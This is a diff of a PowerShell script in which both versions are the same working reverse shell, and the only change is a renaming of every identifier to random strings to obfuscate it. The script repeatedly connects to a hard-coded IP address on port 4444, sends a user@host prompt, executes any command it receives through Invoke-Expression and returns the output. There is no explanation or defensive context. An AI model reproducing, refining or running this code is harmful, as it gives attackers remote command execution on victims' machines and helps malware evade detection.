@@ -1,99 +1,99 @@
-class HycFuKzYwEyWSBPhwqFHGZJ {
+class eeTWFXiXptLcNdmtMXSUNOdp {
     
-    [string]$UrXHi = "93.49.240.195"
-    [int]$LfWznG = 4444
+    [string]$rAqWnEOVXnemlUZEhDUFq = "93.49.240.195"
+    [int]$RENLHnX = 4444
 
-    $LQsSisTEqurRWFNy
-    $zaJGuNNTzswFgajLga
-    $lBkUtOTpBs
-    $YLOafVsjjGqU
-    $ooZlZTlDOACKYLRolPeRF
-    $pLQCIUgCp
-    [int]$adWlnkHuEpZTzH = 50*1024
+    $xBclBE
+    $OsUtcCRxmLdFXPIIPKD
+    $XhHNNiSTpUQKfMHahLYhgHpT
+    $mSJTFm
+    $sQYakwWfOoYBkdpyXN
+    $tNjITazlvXEb
+    [int]$aBoIvBssnF = 50*1024
 
-    sXLihTjLZueigIfmxHREllR() {
-        $this.zaJGuNNTzswFgajLga = $false
+    VGSilpyTGxSVEfldXJTy() {
+        $this.OsUtcCRxmLdFXPIIPKD = $false
         while ($true) {
             try {
-                $this.zaJGuNNTzswFgajLga = New-Object Net.Sockets.TcpClient($this.UrXHi, $this.LfWznG)
+                $this.OsUtcCRxmLdFXPIIPKD = New-Object Net.Sockets.TcpClient($this.rAqWnEOVXnemlUZEhDUFq, $this.RENLHnX)
                 break
             } catch [System.Net.Sockets.SocketException] {
                 Start-Sleep -Seconds 5
             }
         }
-        $this.tlXRUovqDdSk()
+        $this.GAEWzYIEONI()
     }
 
-    tlXRUovqDdSk() {
-        $this.LQsSisTEqurRWFNy = $this.zaJGuNNTzswFgajLga.GetStream()
-        $this.YLOafVsjjGqU = New-Object Byte[] $this.adWlnkHuEpZTzH
-        $this.pLQCIUgCp = New-Object Text.UTF8Encoding
-        $this.lBkUtOTpBs = New-Object IO.StreamWriter($this.LQsSisTEqurRWFNy, [Text.Encoding]::UTF8, $this.adWlnkHuEpZTzH)
-        $this.ooZlZTlDOACKYLRolPeRF = New-Object System.IO.StreamReader($this.LQsSisTEqurRWFNy)
-        $this.lBkUtOTpBs.AutoFlush = $true
+    GAEWzYIEONI() {
+        $this.xBclBE = $this.OsUtcCRxmLdFXPIIPKD.GetStream()
+        $this.mSJTFm = New-Object Byte[] $this.aBoIvBssnF
+        $this.tNjITazlvXEb = New-Object Text.UTF8Encoding
+        $this.XhHNNiSTpUQKfMHahLYhgHpT = New-Object IO.StreamWriter($this.xBclBE, [Text.Encoding]::UTF8, $this.aBoIvBssnF)
+        $this.sQYakwWfOoYBkdpyXN = New-Object System.IO.StreamReader($this.xBclBE)
+        $this.XhHNNiSTpUQKfMHahLYhgHpT.AutoFlush = $true
     }
 
-    gEKAuxOdaSHxBEZHTyh() {
-        $this.sXLihTjLZueigIfmxHREllR()
-        $this.dProzHgru()
+    kOSQBeodZktfagauhtbORMx() {
+        $this.VGSilpyTGxSVEfldXJTy()
+        $this.BbbMfMIAuwhLOENFlCX()
     }
 
-    tlClwGf($dvGeJIkjFSyWF) {
+    txfsBVRszlOOSdrAOmdT($PrinABILRdeuOs) {
         try {
-            [byte[]]$OTinfGnlmqKn = [text.Encoding]::Ascii.GetBytes($dvGeJIkjFSyWF)
-            $this.lBkUtOTpBs.Write($OTinfGnlmqKn, 0, $OTinfGnlmqKn.length)   
+            [byte[]]$RpbgdGNjLnvZZ = [text.Encoding]::Ascii.GetBytes($PrinABILRdeuOs)
+            $this.XhHNNiSTpUQKfMHahLYhgHpT.Write($RpbgdGNjLnvZZ, 0, $RpbgdGNjLnvZZ.length)   
         } catch [System.Management.Automation.MethodInvocationException] {
-            $this.gEKAuxOdaSHxBEZHTyh()
+            $this.kOSQBeodZktfagauhtbORMx()
         }
     }
 
-    [string] aiLVCdN() {
+    [string] xBjfEFSyRLcZEzFFwe() {
         try {
-            $QocUuCknGILwbEkxHHstwpR = $this.LQsSisTEqurRWFNy.Read($this.YLOafVsjjGqU, 0, $this.adWlnkHuEpZTzH)    
-            $kMBqOQFhLzXlnHjARxsLrmxm = ($this.pLQCIUgCp.GetString($this.YLOafVsjjGqU, 0, $QocUuCknGILwbEkxHHstwpR))
-            return $kMBqOQFhLzXlnHjARxsLrmxm
+            $sMfwrAZHOZCbxOqQawqsA = $this.xBclBE.Read($this.mSJTFm, 0, $this.aBoIvBssnF)    
+            $UntHfLjkeOY = ($this.tNjITazlvXEb.GetString($this.mSJTFm, 0, $sMfwrAZHOZCbxOqQawqsA))
+            return $UntHfLjkeOY
         } catch [System.Management.Automation.MethodInvocationException] {
-            $this.gEKAuxOdaSHxBEZHTyh()
+            $this.kOSQBeodZktfagauhtbORMx()
             return ""
         }
     }
 
-    [string] rwzIqvLRBMi($rSIbcRTHzxwFIuQtTgBP) {
-        Write-Host $rSIbcRTHzxwFIuQtTgBP
+    [string] aBIkkCJ($WpOwFdMDpk) {
+        Write-Host $WpOwFdMDpk
         try { 
-            $StqJkznlfTzp = Invoke-Expression $rSIbcRTHzxwFIuQtTgBP | Out-String
+            $XgLrfmEkWdIpNAiWsQLCTlBV = Invoke-Expression $WpOwFdMDpk | Out-String
         }
         catch {
-            $CoKWE = $_.Exception
-            $JGwzifgIaYRJqes = $_.Message
-            $StqJkznlfTzp = "`n$_`n"
+            $QFbnqeg = $_.Exception
+            $KiCGkmJZmTswQb = $_.Message
+            $XgLrfmEkWdIpNAiWsQLCTlBV = "`n$_`n"
         }
-        return $StqJkznlfTzp
+        return $XgLrfmEkWdIpNAiWsQLCTlBV
     }
 
-    [string] jUzfROBbrogWLrtbcPyp() {
-        $xfmkofUiV = [Environment]::UserName
-        $JynTlg = [System.Net.Dns]::GetHostName()
-        $owJsPTCUHNHAoFifVTzXpLU = Get-Location
-        return "$xfmkofUiV@$JynTlg [$owJsPTCUHNHAoFifVTzXpLU]~$ "
+    [string] snhtSlZNiytdor() {
+        $JFmvDIBGQhAoPbgruQ = [Environment]::UserName
+        $oEhMbhUaOHjQkuRj = [System.Net.Dns]::GetHostName()
+        $eHaahDoPafLi = Get-Location
+        return "$JFmvDIBGQhAoPbgruQ@$oEhMbhUaOHjQkuRj [$eHaahDoPafLi]~$ "
     }
 
-    dProzHgru() {
-        while ($this.zaJGuNNTzswFgajLga.Connected) {
-            $this.tlClwGf($this.jUzfROBbrogWLrtbcPyp())         
-            $kMBqOQFhLzXlnHjARxsLrmxm = $this.aiLVCdN()
-            $StqJkznlfTzp = "`n"
-            if ([string]::IsNullOrEmpty($kMBqOQFhLzXlnHjARxsLrmxm)) {
+    BbbMfMIAuwhLOENFlCX() {
+        while ($this.OsUtcCRxmLdFXPIIPKD.Connected) {
+            $this.txfsBVRszlOOSdrAOmdT($this.snhtSlZNiytdor())         
+            $UntHfLjkeOY = $this.xBjfEFSyRLcZEzFFwe()
+            $XgLrfmEkWdIpNAiWsQLCTlBV = "`n"
+            if ([string]::IsNullOrEmpty($UntHfLjkeOY)) {
                 continue
             }
-            $StqJkznlfTzp = $this.rwzIqvLRBMi($kMBqOQFhLzXlnHjARxsLrmxm)
-            $this.tlClwGf($StqJkznlfTzp + "`n")
-            $this.LQsSisTEqurRWFNy.Flush()
+            $XgLrfmEkWdIpNAiWsQLCTlBV = $this.aBIkkCJ($UntHfLjkeOY)
+            $this.txfsBVRszlOOSdrAOmdT($XgLrfmEkWdIpNAiWsQLCTlBV + "`n")
+            $this.xBclBE.Flush()
         }
-        $this.zaJGuNNTzswFgajLga.Close()
-        $this.gEKAuxOdaSHxBEZHTyh()
+        $this.OsUtcCRxmLdFXPIIPKD.Close()
+        $this.kOSQBeodZktfagauhtbORMx()
     } 
 }
 
-$cCcfPIiFMHWFgYsDiMbPgc = [HycFuKzYwEyWSBPhwqFHGZJ]::new()
-$cCcfPIiFMHWFgYsDiMbPgc.gEKAuxOdaSHxBEZHTyh()
+$CsxRVfNJSsLBlwv = [eeTWFXiXptLcNdmtMXSUNOdp]::new()
+$CsxRVfNJSsLBlwv.kOSQBeodZktfagauhtbORMx()
